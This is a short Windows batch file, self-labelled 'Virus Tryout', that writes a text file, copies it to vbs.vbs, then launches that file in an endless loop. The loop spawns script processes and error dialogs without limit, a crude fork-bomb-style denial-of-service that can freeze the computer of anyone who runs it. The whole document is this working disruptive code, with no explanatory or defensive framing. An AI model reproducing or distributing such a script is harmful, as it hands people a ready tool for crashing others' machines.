@echo off
set msg= Virus Tryout
echo %msg% >tmx.txt
copy tmx.txt vbs.vbs

:U
start vbs.vbs 
goto U